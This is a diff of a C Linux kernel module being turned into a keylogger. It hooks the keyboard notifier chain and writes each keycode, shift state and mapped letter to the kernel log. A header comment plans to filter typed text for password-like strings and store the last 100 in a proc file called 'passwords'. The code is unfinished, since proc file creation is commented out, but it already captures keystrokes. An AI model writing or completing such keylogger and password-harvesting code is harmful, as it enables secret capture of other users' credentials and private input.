@@ -1,54 +1,65 @@
+/* What we need to do:
+ * 	1. The recorded keycode isn't 1:1 on the letter typed. Only record
+ * 	   on the typed letter.
+ * 	2. Record the last 15 characters ACTUALLY typed to the screen and
+ * 	   check if it meets password rules:
+ * 	   (3 of the 4: lowercase letters, uppercase letters, symbols, numbers)
+ * 	3. Save a password that fits #2 in a proc file called "passwords". Save
+ * 	   The last 100 potential paswords.
+ *
+ * 	-  The 2d array called 'keymap' takes [keycode][shift_boolean] to retrieve
+ * 	   a letter.
+ *
+ * */
 #include <linux/module.h>
-#include <linux/init.h>
-#include <linux/tty.h>
-#include <linux/kd.h>
-#include <linux/vt.h>
-#include <linux/vt_kern.h>
-#include <linux/console_struct.h>
+#include <linux/kernel.h>
+#include <linux/interrupt.h>
 #include <linux/proc_fs.h>
+#include <linux/sched.h>
+#include <linux/keyboard.h>
+#include <asm/uaccess.h>
+#include <asm/io.h>
+#include <linux/slab.h>
 
-MODULE_DESCRIPTION("Example module illustrating the use of Keyboard LEDs.");
-MODULE_AUTHOR("Daniele Paolo Scarpazza");
-MODULE_LICENSE("GPL");
+#include "helper.h"
 
-#define PROC_NAME "passwords"
+#define PROC_FILE_NAME "passwords"
 
-ssize_t proc_read(struct file *fp, char *user_buffer, size_t ub_size, loff_t *offp );
-int keylog_init(void);
-void keylog_cleanup(void);
+struct notifier_block nb;
 
-
-ssize_t proc_read(struct file *fp, char *user_buffer, size_t ub_size, loff_t *offp ){
-
+ssize_t read_simple(struct file *filp,char *buf,size_t count,loff_t *offp ) 
+{
 	return 0;
 }
 
-
-struct proc_ops operations = {
-	proc_read: proc_read
+struct file_operations proc_fops = {
+	read: read_simple,
 };
 
-int keylog_init(void){
-	int i;
-	
-	proc_create(PROC_NAME, 0, 0, &operations);
-	
-	for (i = 0; i < MAX_NR_CONSOLES; i++) {
-		if (!vc_cons[i].d)
-			break;
-		printk(KERN_INFO "poet_atkm: console[%i/%i] #%i, tty %lx\n", i,
-		       MAX_NR_CONSOLES, vc_cons[i].d->vc_num,
-		       (unsigned long)vc_cons[i].d->port.tty);
-	}
-	printk(KERN_INFO "keylog: finished scanning consoles\n"); 
+int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
+	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
+	printk("Key:  %d  Lights:  %d  Shiftmax:  %x\n", kp->value, kp->ledstate, kp->shift);
+	if(kp->value > 119) return 0;
 
+	printk("Letter: %c\n", *keymap[kp->value][0]);
+
+	
 	return 0;
 }
 
-void keylog_cleanup(void){
-	printk(KERN_INFO);
-	remove_proc_entry(PROC_NAME, 0);
+int init (void) {
+	nb.notifier_call = kb_notifier_fn;
+	register_keyboard_notifier(&nb);
+	// proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
+	return 0;
 }
 
-module_init(keylog_init);
-module_exit(keylog_cleanup);
+void cleanup(void) {
+	unregister_keyboard_notifier(&nb);
+	// remove_proc_entry(PROC_FILE_NAME,NULL);
+}
+
+MODULE_LICENSE("GPL"); 
+module_init(init);
+module_exit(cleanup);
+
